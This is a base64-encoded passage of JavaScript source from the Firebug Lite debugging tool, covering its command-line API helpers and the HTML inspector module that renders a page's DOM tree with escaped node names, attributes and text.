b2UgVGhpcyBpcyBraW5kIG9mIGEgcG9vci1tYW4ncyBKYXZhU2NyaXB0IHBhcnNlciAtIHRyeWluZw0KICAgIC8vIHRvIGZpbmQgdGhlIHN0YXJ0IG9mIHRoZSBleHByZXNzaW9uIHRoYXQgdGhlIGN1cnNvciBpcyBpbnNpZGUuDQogICAgLy8gTm90IDEwMCUgZm9vbCBwcm9vZiwgYnV0IGhleS4uLg0KDQogICAgdmFyIGJyYWNrZXRDb3VudCA9IDA7DQoNCiAgICB2YXIgc3RhcnQgPSBjb21tYW5kLmxlbmd0aC0xOw0KICAgIGZvciAoOyBzdGFydCA+PSAwOyAtLXN0YXJ0KQ0KICAgIHsNCiAgICAgICAgdmFyIGMgPSBjb21tYW5kW3N0YXJ0XTsNCiAgICAgICAgaWYgKChjID09ICIsIiB8fCBjID09ICI7IiB8fCBjID09ICIgIikgJiYgIWJyYWNrZXRDb3VudCkNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBpZiAocmVPcGVuQnJhY2tldC50ZXN0KGMpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoYnJhY2tldENvdW50KQ0KICAgICAgICAgICAgICAgIC0tYnJhY2tldENvdW50Ow0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKHJlQ2xvc2VCcmFja2V0LnRlc3QoYykpDQogICAgICAgICAgICArK2JyYWNrZXRDb3VudDsNCiAgICB9DQoNCiAgICByZXR1cm4gc3RhcnQgKyAxOw0KfQ0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbW1hbmRMaW5lIEFQSQ0KDQp2YXIgQ29tbWFuZExpbmVBUEkgPQ0Kew0KICAgICQ6IGZ1bmN0aW9uKGlkKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIEZpcmVidWcuYnJvd3Nlci5kb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7DQogICAgfSwNCg0KICAgICQkOiBmdW5jdGlvbihzZWxlY3RvciwgY29udGV4dCkNCiAgICB7DQogICAgICAgIGNvbnRleHQgPSBjb250ZXh0IHx8IEZpcmVidWcuYnJvd3Nlci5kb2N1bWVudDsNCiAgICAgICAgcmV0dXJuIEZpcmVidWcuU2VsZWN0b3IgPyANCiAgICAgICAgICAgICAgICBGaXJlYnVnLlNlbGVjdG9yKHNlbGVjdG9yLCBjb250ZXh0KSA6IA0KICAgICAgICAgICAgICAgIEZpcmVidWcuQ29uc29sZS5lcnJvcigiRmlyZWJ1Zy5TZWxlY3RvciBtb2R1bGUgbm90IGxvYWRlZC4iKTsNCiAgICB9LA0KICAgIA0KICAgICQwOiBudWxsLA0KICAgIA0KICAgICQxOiBudWxsLA0KICAgIA0KICAgIGRpcjogZnVuY3Rpb24obykNCiAgICB7DQogICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2cobywgRmlyZWJ1Zy5jb250ZXh0LCAiZGlyIiwgRmlyZWJ1Zy5ET01QYW5lbC5EaXJUYWJsZSk7DQogICAgfSwNCg0KICAgIGRpcnhtbDogZnVuY3Rpb24obykNCiAgICB7DQogICAgICAgIC8vL2lmIChvIGluc3RhbmNlb2YgV2luZG93KQ0KICAgICAgICBpZiAoaW5zdGFuY2VPZihvLCAiV2luZG93IikpDQogICAgICAgICAgICBvID0gby5kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQ7DQogICAgICAgIC8vL2Vsc2UgaWYgKG8gaW5zdGFuY2VvZiBEb2N1bWVudCkNCiAgICAgICAgZWxzZSBpZiAoaW5zdGFuY2VPZihvLCAiRG9jdW1lbnQiKSkNCiAgICAgICAgICAgIG8gPSBvLmRvY3VtZW50RWxlbWVudDsNCg0KICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nKG8sIEZpcmVidWcuY29udGV4dCwgImRpcnhtbCIsIEZpcmVidWcuSFRNTFBhbmVsLlNvbG9FbGVtZW50KTsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdmFyIGRlZmluZUNvbW1hbmRMaW5lQVBJID0gZnVuY3Rpb24gZGVmaW5lQ29tbWFuZExpbmVBUEkoKQ0Kew0KICAgIEZpcmVidWcuQ29tbWFuZExpbmUuQVBJID0ge307DQogICAgZm9yICh2YXIgbSBpbiBDb21tYW5kTGluZUFQSSkNCiAgICAgICAgaWYgKCFFbnYuYnJvd3Nlci53aW5kb3dbbV0pDQogICAgICAgICAgICBGaXJlYnVnLkNvbW1hbmRMaW5lLkFQSVttXSA9IENvbW1hbmRMaW5lQVBJW21dOw0KICAgIA0KICAgIHZhciBzdGFjayA9IEZpcmVidWdDaHJvbWUuaHRtbFNlbGVjdGlvblN0YWNrOw0KICAgIGlmIChzdGFjaykNCiAgICB7DQogICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuQVBJLiQwID0gc3RhY2tbMF07DQogICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuQVBJLiQxID0gc3RhY2tbMV07DQogICAgfQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9fSk7DQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEdsb2JhbHMNCg0KdmFyIEVsZW1lbnRDYWNoZSA9IEZpcmVidWcuTGl0ZS5DYWNoZS5FbGVtZW50Ow0KdmFyIGNhY2hlSUQgPSBGaXJlYnVnLkxpdGUuQ2FjaGUuSUQ7DQoNCnZhciBpZ25vcmVIVE1MUHJvcHMgPQ0Kew0KICAgIC8vIGlnbm9yZXMgdGhlIGF0dHJpYnV0ZXMgaW5qZWN0ZWQgYnkgU2l6emxlLCBvdGhlcndpc2UgaXQgd2lsbCANCiAgICAvLyBiZSB2aXNpYmxlIG9uIElFICh3aGVuIGVudW1lcmF0aW5nIGVsZW1lbnQuYXR0cmlidXRlcykNCiAgICBzaXpjYWNoZTogMSwNCiAgICBzaXpzZXQ6IDENCn07DQoNCmlmIChGaXJlYnVnLmlnbm9yZUZpcmVidWdFbGVtZW50cykNCiAgICAvLyBpZ25vcmVzIGFsc28gdGhlIGNhY2hlIHByb3BlcnR5IGluamVjdGVkIGJ5IGZpcmVidWcNCiAgICBpZ25vcmVIVE1MUHJvcHNbY2FjaGVJRF0gPSAxOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gSFRNTCBNb2R1bGUNCg0KRmlyZWJ1Zy5IVE1MID0gZXh0ZW5kKEZpcmVidWcuTW9kdWxlLCANCnsNCiAgICBhcHBlbmRUcmVlTm9kZTogZnVuY3Rpb24obm9kZUFycmF5LCBodG1sKQ0KICAgIHsNCiAgICAgICAgdmFyIHJlVHJpbSA9IC9eXHMrfFxzKyQvZzsNCiAgICAgICAgDQogICAgICAgIGlmICghbm9kZUFycmF5Lmxlbmd0aCkgbm9kZUFycmF5ID0gW25vZGVBcnJheV07DQogICAgICAgIA0KICAgICAgICBmb3IgKHZhciBuPTAsIG5vZGU7IG5vZGU9bm9kZUFycmF5W25dOyBuKyspDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChub2RlLm5vZGVUeXBlID09IDEpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKEZpcmVidWcuaWdub3JlRmlyZWJ1Z0VsZW1lbnRzICYmIG5vZGUuZmlyZWJ1Z0lnbm9yZSkgY29udGludWU7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIHVpZCA9IEVsZW1lbnRDYWNoZShub2RlKTsNCiAgICAgICAgICAgICAgICB2YXIgY2hpbGQgPSBub2RlLmNoaWxkTm9kZXM7DQogICAgICAgICAgICAgICAgdmFyIGNoaWxkTGVuZ3RoID0gY2hpbGQubGVuZ3RoOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHZhciBub2RlTmFtZSA9IG5vZGUubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgbm9kZVZpc2libGUgPSBpc1Zpc2libGUobm9kZSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIGhhc1NpbmdsZVRleHRDaGlsZCA9IGNoaWxkTGVuZ3RoID09IDEgJiYgbm9kZS5maXJzdENoaWxkLm5vZGVUeXBlID09IDMgJiYNCiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGVOYW1lICE9ICJzY3JpcHQiICYmIG5vZGVOYW1lICE9ICJzdHlsZSI7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIG5vZGVDb250cm9sID0gIWhhc1NpbmdsZVRleHRDaGlsZCAmJiBjaGlsZExlbmd0aCA+IDAgPyANCiAgICAgICAgICAgICAgICAgICAgKCc8ZGl2IGNsYXNzPSJub2RlQ29udHJvbCI+PC9kaXY+JykgOiAnJzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyBGSVhNRSB4eHhwZWRybyByZW1vdmUgdGhpcw0KICAgICAgICAgICAgICAgIC8vdmFyIGlzSUUgPSBmYWxzZTsNCg0KICAgICAgICAgICAgICAgIGlmKGlzSUUgJiYgbm9kZUNvbnRyb2wpDQogICAgICAgICAgICAgICAgICAgIGh0bWwucHVzaChub2RlQ29udHJvbCk7DQogICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgdWlkICE9ICd1bmRlZmluZWQnKQ0KICAgICAgICAgICAgICAgICAgICBodG1sLnB1c2goDQogICAgICAgICAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0ib2JqZWN0Qm94LWVsZW1lbnQiICcsDQogICAgICAgICAgICAgICAgICAgICAgICAnaWQ9IicsIHVpZCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAnIj4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgIWlzSUUgJiYgbm9kZUNvbnRyb2wgPyBub2RlQ29udHJvbDogIiIsICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAnPHNwYW4gJywNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhY2hlSUQsIA0KICAgICAgICAgICAgICAgICAgICAgICAgJz0iJywgdWlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgJyIgIGNsYXNzPSJub2RlQm94JywNCiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGVWaXNpYmxlID8gIiIgOiAiIG5vZGVIaWRkZW4iLA0KICAgICAgICAgICAgICAgICAgICAgICAgJyI+Jmx0OzxzcGFuIGNsYXNzPSJub2RlVGFnIj4nLCBub2RlTmFtZSwgJzwvc3Bhbj4nDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBodG1sLnB1c2goDQogICAgICAgICAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0ib2JqZWN0Qm94LWVsZW1lbnQiPjxzcGFuIGNsYXNzPSJub2RlQm94JywNCiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGVWaXNpYmxlID8gIiIgOiAiIG5vZGVIaWRkZW4iLA0KICAgICAgICAgICAgICAgICAgICAgICAgJyI+Jmx0OzxzcGFuIGNsYXNzPSJub2RlVGFnIj4nLCANCiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGVOYW1lLCAnPC9zcGFuPicNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IG5vZGUuYXR0cmlidXRlcy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBhdHRyID0gbm9kZS5hdHRyaWJ1dGVzW2ldOw0KICAgICAgICAgICAgICAgICAgICBpZiAoIWF0dHIuc3BlY2lmaWVkIHx8IA0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gSXNzdWUgNDQzMjogIEZpcmVidWcgTGl0ZTogSFRNTCBpcyBtaXhlZC11cCB3aXRoIGZ1bmN0aW9ucw0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gVGhlIHByb2JsZW0gaGVyZSBpcyB0aGF0IGV4cGFuZG8gcHJvcGVydGllcyBhZGRlZCB0byBET00gZWxlbWVudHMgaW4gDQogICAgICAgICAgICAgICAgICAgICAgICAvLyBJRSA8IDkgd2lsbCBiZWhhdmUgbGlrZSBET00gYXR0cmlidXRlcyBhbmQgc28gdGhleSdsbCBzaG93IHVwIHdoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGxvb2tpbmcgYXQgZWxlbWVudC5hdHRyaWJ1dGVzIGxpc3QuIA0KICAgICAgICAgICAgICAgICAgICAgICAgaXNJRSAmJiAoYnJvd3NlclZlcnNpb24tMDw5KSAmJiB0eXBlb2YgYXR0ci5ub2RlVmFsdWUgIT0gInN0cmluZyIgfHwNCiAgICAgICAgICAgICAgICAgICAgICAgIEZpcmVidWcuaWdub3JlRmlyZWJ1Z0VsZW1lbnRzICYmIGlnbm9yZUhUTUxQcm9wcy5oYXNPd25Qcm9wZXJ0eShhdHRyLm5vZGVOYW1lKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHZhciBuYW1lID0gYXR0ci5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpOw0KICAgICAgICAgICAgICAgICAgICB2YXIgdmFsdWUgPSBuYW1lID09ICJzdHlsZSIgPyBmb3JtYXRTdHlsZXMobm9kZS5zdHlsZS5jc3NUZXh0KSA6IGF0dHIubm9kZVZhbHVlOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaHRtbC5wdXNoKCcmbmJzcDs8c3BhbiBjbGFzcz0ibm9kZU5hbWUiPicsIG5hbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAnPC9zcGFuPj0mcXVvdDs8c3BhbiBjbGFzcz0ibm9kZVZhbHVlIj4nLCBlc2NhcGVIVE1MKHZhbHVlKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICc8L3NwYW4+JnF1b3Q7Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8qDQogICAgICAgICAgICAgICAgLy8gc291cmNlIGNvZGUgbm9kZXMNCiAgICAgICAgICAgICAgICBpZiAobm9kZU5hbWUgPT0gJ3NjcmlwdCcgfHwgbm9kZU5hbWUgPT0gJ3N0eWxlJykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYoZG9jdW1lbnQuYWxsKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzcmMgPSBub2RlLmlubmVySFRNTCsnXG4nOw0KICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgfWVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHNyYyA9ICdcbicrbm9kZS5pbm5lckhUTUwrJ1xuJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdmFyIG1hdGNoID0gc3JjLm1hdGNoKC9cbi9nKTsNCiAgICAgICAgICAgICAgICAgICAgdmFyIG51bSA9IG1hdGNoID8gbWF0Y2gubGVuZ3RoIDogMDsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHMgPSBbXSwgc2wgPSAwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgZm9yKHZhciBjPTE7IGM8bnVtOyBjKyspew0KICAgICAgICAgICAgICAgICAgICAgICAgc1tzbCsrXSA9ICc8ZGl2IGxpbmU9IicrYysnIj4nICsgYyArICc8L2Rpdj4nOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBodG1sLnB1c2goJyZndDs8L2Rpdj48ZGl2IGNsYXNzPSJub2RlR3JvdXAiPjxkaXYgY2xhc3M9Im5vZGVDaGlsZHJlbiI+PGRpdiBjbGFzcz0ibGluZU5vIj4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuam9pbignJyksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJzwvZGl2PjxwcmUgY2xhc3M9Im5vZGVDb2RlIj4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVzY2FwZUhUTUwoc3JjKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPC9wcmU+JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPC9kaXY+PGRpdiBjbGFzcz0ib2JqZWN0Qm94LWVsZW1lbnQiPiZsdDsvPHNwYW4gY2xhc3M9Im5vZGVUYWciPicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9kZU5hbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJzwvc3Bhbj4mZ3Q7PC9kaXY+JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPC9kaXY+Jw0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9LyoqLw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIEp1c3QgYSBzaW5nbGUgdGV4dCBub2RlIGNoaWxkDQogICAgICAgICAgICAgICAgaWYgKGhhc1NpbmdsZVRleHRDaGlsZCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciB2YWx1ZSA9IGNoaWxkWzBdLm5vZGVWYWx1ZS5yZXBsYWNlKHJlVHJpbSwgJycpOw0KICAgICAgICAgICAgICAgICAgICBpZih2YWx1ZSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaHRtbC5wdXNoKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJmd0OzxzcGFuIGNsYXNzPSJub2RlVGV4dCI+JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXNjYXBlSFRNTCh2YWx1ZSksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc8L3NwYW4+Jmx0Oy88c3BhbiBjbGFzcz0ibm9kZVRhZyI+JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9kZU5hbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc8L3NwYW4+Jmd0Ozwvc3Bhbj48L2Rpdj4nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgaHRtbC5wdXNoKCcvJmd0Ozwvc3Bhbj48L2Rpdj4nKTsgLy8gYmxhbmsgdGV4dCwgcHJpbnQgYXMgY2hpbGRsZXNzIG5vZGUNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZSBpZiAoY2hpbGRMZW5ndGggPiAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaHRtbC5wdXNoKCcmZ3Q7PC9zcGFuPjwvZGl2PicpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgICAgICAgICBodG1sLnB1c2goJy8mZ3Q7PC9zcGFuPjwvZGl2PicpOw0KICAgICAgICAgIA0KICAgICAgICAgICAgfSANCiAgICAgICAgICAgIGVsc2UgaWYgKG5vZGUubm9kZVR5cGUgPT0gMykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoIG5vZGUucGFyZW50Tm9kZSAmJiAoIG5vZGUucGFyZW50Tm9kZS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09ICJzY3JpcHQiIHx8DQogICAgICAgICAgICAgICAgICAgICBub2RlLnBhcmVudE5vZGUubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PSAic3R5bGUiICkgKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gbm9kZS5ub2RlVmFsdWUucmVwbGFjZShyZVRyaW0sICcnKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmKGlzSUUpew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHNyYyA9IHZhbHVlKydcbic7DQogICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB9ZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3JjID0gJ1xuJyt2YWx1ZSsnXG4nOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB2YXIgbWF0Y2ggPSBzcmMubWF0Y2goL1xuL2cpOw0KICAgICAgICAgICAgICAgICAgICB2YXIgbnVtID0gbWF0Y2ggPyBtYXRjaC5sZW5ndGggOiAwOw0KICAgICAgICAgICAgICAgICAgICB2YXIgcyA9IFtdLCBzbCA9IDA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBmb3IodmFyIGM9MTsgYzxudW07IGMrKyl7DQogICAgICAgICAgICAgICAgICAgICAgICBzW3NsKytdID0gJzxkaXYgbGluZT0iJytjKyciPicgKyBjICsgJzwvZGl2Pic7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnPGRpdiBjbGFzcz0ibGluZU5vIj4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuam9pbignJyksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJzwvZGl2PjxwcmUgY2xhc3M9InNvdXJjZUNvZGUiPicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXNjYXBlSFRNTChzcmMpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICc8L3ByZT4nDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgdmFsdWUgPSBub2RlLm5vZGVWYWx1ZS5yZXBsYWNlKHJlVHJpbSwgJycpOw0KICAgICAgICAgICAgICAgICAgICBpZiAodmFsdWUpDQogICAgICAgICAgICAgICAgICAgICAgICBodG1sLnB1c2goJzxkaXYgY2xhc3M9Im5vZGVUZXh0Ij4nLCBlc2NhcGVIVE1MKHZhbHVlKSwnPC9kaXY+Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBhcHBlbmRUcmVlQ2hpbGRyZW46IGZ1bmN0aW9uKHRyZWVOb2RlKQ0KICAgIHsNCiAgICAgICAgdmFyIGRvYyA9IEZpcmVidWcuY2hyb21lLmRvY3VtZW50Ow0KICAgICAgICB2YXIgdWlkID0gdHJlZU5vZGUuaWQ7DQogICAgICAgIHZhciBwYXJlbnROb2RlID0gRWxlbWVudENhY2hlLmdldCh1aWQpOw0KICAgICAgICANCiAgICAgICAgaWYgKHBhcmVudE5vZGUuY2hpbGROb2Rlcy5sZW5ndGggPT0gMCkgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgdmFyIHRyZWVOZXh0ID0gdHJlZU5vZGUubmV4dFNpYmxpbmc7DQogICAgICAgIHZhciB0cmVlUGFyZW50ID0gdHJlZU5vZGUucGFyZW50Tm9kZTsNCiAgICAgICAgDQogICAgICAgIC8vIEZJWE1FIHh4eHBlZHJvIHJlbW92ZSB0aGlzDQogICAgICAgIC8vdmFyIGlzSUUgPSBmYWxzZTsNCiAgICAgICAgdmFyIGNvbnRyb2wgPSBpc0lFID8gdHJlZU5vZGUucHJldmlvdXNTaWJsaW5nIDogdHJlZU5vZGUuZmlyc3RDaGlsZDsNCiAgICAgICAgY29udHJvbC5jbGFzc05hbWUgPSAnbm9kZUNvbnRyb2wgbm9kZU1heGltaXplZCc7DQogICAgICAgIA0KICAgICAgICB2YXIgaHRtbCA9IFtdOw0KICAgICAgICB2YXIgY2hpbGRyZW4gPSBkb2MuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIGNoaWxkcmVuLmNsYXNzTmFtZSA9ICJub2RlQ2hpbGRyZW4iOw0KICAgICAgICB0aGlzLmFwcGVuZFRyZWVOb2RlKHBhcmVudE5vZGUuY2hpbGROb2RlcywgaHRtbCk7DQogICAgICAgIGNoaWxkcmVuLmlubmVySFRNTCA9IGh0bWwuam9pbigiIik7DQogICAgICAgIA0KICAgICAgICB0cmVlUGFyZW50Lmluc2VydEJlZm9yZShjaGlsZHJlbiwgdHJlZU5leHQpOw0KICAgICAgICANCiAgICAgICAgdmFyIGNsb3NlRWxlbWVudCA9IGRvYy5jcmVhdGVFbGVtZW50KCJkaXYiKTsNCiAgICAgICAgY2xvc2VFbGVtZW50LmNsYXNzTmFtZSA9ICJvYmplY3RCb3gtZWxlbWVudCI7DQogICAgICAgIGNsb3NlRWxlbWVudC5pbm5lckhUTUwgPSAnJmx0Oy88c3BhbiBjbGFzcz0ibm9kZVRhZyI+JyArIA0KICAgICAgICAgICAgcGFyZW50Tm9kZS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpICsgJyZndDs8L3NwYW4+JzsNCiAgICAgICAgDQogICAgICAgIHRyZWVQYXJlbnQuaW5zZXJ0QmVmb3JlKGNsb3NlRWxlbWVudCwgdHJlZU5leHQpOw0KICAgICAgICANCiAgICB9LA0KICAgIA0KICAgIHJlbW92ZVRyZWVDaGlsZHJlbjogZnVuY3Rpb24odHJlZU5vZGUpDQogICAgew0KICAgICAgICB2YXIgY2hpbGRyZW4gPSB0cmVlTm9kZS5uZXh0U2libGluZzsNCiAgICAgICAgdmFyIGNsb3NlVGFnID0gY2hpbGRyZW4ubmV4dFNpYmxpbmc7DQogICAgICAgIA0KICAgICAgICAvLyBGSVhNRSB4eHhwZWRybyByZW1vdmUgdGhpcw0KICAgICAgICAvL3ZhciBpc0lFID0gZmFsc2U7DQogICAgICAgIHZhciBjb250cm9sID0gaXNJRSA/IHRyZWVOb2RlLnByZXZpb3VzU2libGluZyA6IHRyZWVOb2RlLmZpcnN0Q2hpbGQ7DQogICAgICAgIGNvbnRyb2wuY2xhc3NOYW1lID0gJ25vZGVDb250cm9sJzsNCiAgICAgICAgDQogICAgICAgIGNoaWxkcmVuLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoY2hpbGRyZW4pOyAgDQogICAgICAgIGNsb3NlVGFnLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoY2xvc2VUYWcpOyAgDQogICAgfSwNCiAgICANCiAgICBpc1RyZWVOb2RlVmlzaWJsZTogZnVuY3Rpb24oaWQpDQogICAgew0KICAgICAgICByZXR1cm4gJChpZCk7DQogICAgfSwNCiAgICANCiAgICBzZWxlY3Q6IGZ1bmN0aW9uKGVsKQ0KICAgIHsNCiAgICAgICAgdmFyIGlkID0gZWwgJiYgRWxlbWVudENhY2hlKGVsKTsNCiAgICAgICAgaWYgKGlkKQ0KICAgICAgICAgICAgdGhpcy5zZWxlY3RUcmVlTm9kZShpZCk7DQogICAgfSwNCiAgICANCiAgICBzZWxlY3RUcmVlTm9kZTogZnVuY3Rpb24oaWQpDQogICAgew0KICAgICAgICBpZCA9ICIiK2lkOw0KICAgICAgICB2YXIgbm9kZSwgc3RhY2sgPSBbXTsNCiAgICAgICAgd2hpbGUoaWQgJiYgIXRoaXMuaXNUcmVlTm9kZVZpc2libGUoaWQpKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdGFjay5wdXNoKGlkKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIG5vZGUgPSBFbGVtZW50Q2FjaGUuZ2V0KGlkKS5